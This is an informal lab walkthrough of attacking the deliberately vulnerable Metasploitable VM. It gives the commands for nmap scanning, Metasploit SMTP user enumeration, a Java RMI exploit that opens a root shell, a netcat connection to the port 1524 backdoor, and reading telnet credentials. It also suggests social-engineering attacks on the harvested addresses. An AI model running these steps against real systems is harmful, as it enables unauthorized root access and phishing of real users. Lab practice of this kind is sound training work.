First we need to discover the network
	sudo netdiscover
now lets do a NMAP on the network and figure out what ports are open
	sudo nmap -sC -sV -sS -Pn -p- -vv -A -O 10.10.10.4
We know that there is a bunch of ports open, lets start to get into the ones we have not done yet
Lets first do SMTP and find some e-mail addresses that we can enumarte users from (port 25)
	open metasploit
		msfconsole
	search smtp
	now lest figure out what versin smtp we are using, we do this through a banner grab
		use 8
		show options
		set rhosts 10.10.10.4
		run
			we can see it is Ubuntu metasploitable.localdomain 
		lets get some users from the database
			search smtp
			use 5
			show options
			set rhosts 10.10.10.4
			THIS MAY TAKE A MINUTE
		Here is a list of SMTP commands that can be used when in the system

While that is working lets move onto something else
We have, on port 1099, JAVA RMI, lets see what we can do with this
	In another terminal open metasploit
	search java 
		There is a lot of stuff in there, lets break it down a little further
		In the NMAP scan we can see that is ia java-rmi, most likely a server
		ok cool, lets do a search for java_rmi
			set rhosts 10.10.10.4
			set lhost 10.10.10.5
			set srvhost 10.10.10.5
		Ok right now it wasn't working to well for me, so I decided to try a different target
			show targets
			use Linux (2)
			run
			sessions -i
			sessions 1
			shell
			whoami
				we are root, now have fun and jack some stuff up!!!
By this time we can see that SMTP has ran through its process
Each user found would be an e-mail address, now alls we need to do is start some social enginnering attacks
	Now for a quick one, the famous backdoor on port 1524
		start a listening port in command line 
			nc 10.10.10.4 1524
				and we are root :)
Lastly, lets do a quick telnet
	First we need to download telnet, so change your connections to be able to hit the internet on the Kali machine
	This should only take about 10 seconds
	Now go back to the metasploit machine
	telnet 10.10.10.4
		and right there at the top it gives you the username and password... that was easy
